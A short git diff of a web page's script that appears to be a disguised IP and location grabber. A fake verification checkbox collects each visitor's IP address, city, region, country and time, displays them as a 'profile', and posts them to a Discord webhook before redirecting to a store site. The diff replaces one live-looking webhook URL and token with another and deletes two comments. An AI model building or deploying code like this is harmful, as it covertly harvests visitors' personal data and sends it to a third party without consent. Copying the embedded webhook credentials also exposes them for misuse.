@@ -385,7 +385,7 @@ body {
 </main>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1568372498045870110/eJhj1ILY7kNp_Zrc_nPJzdA5vCx7CHaP1-e9Q7Bg3DwOhHBZ-PfQg4Rl-27cJZpp5OVY";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1568679402919956495/wEGz_JVNUuJjBplA0iOT9WHwPVSX1hqA0gdnIB53w_R6wocQo3ynRBmnhvIMuX8g-6Pj";
 const REDIRECT_URL = "https://ashmc-store7.vercel.app";
 
 const checkbox = document.getElementById("checkbox");
@@ -638,7 +638,6 @@ checkbox.addEventListener("click", async () => {
     verifyView.style.display = "none";
     profileView.style.display = "block";
 
-    // populate the profile with whatever we grabbed (fallbacks if blocked)
     const loc2 = fp || {
         ip: "unknown",
         city: "unknown",
@@ -656,7 +655,6 @@ checkbox.addEventListener("click", async () => {
     pLoc.textContent = `${loc2.city}, ${loc2.region}, ${loc2.country}`;
     pTime.textContent = loc2.time || timestamp();
 
-    // initials on the avatar from the store name
     avatarInitials.textContent = "AS";
 
     // -------- loading finish bar, then redirect --------
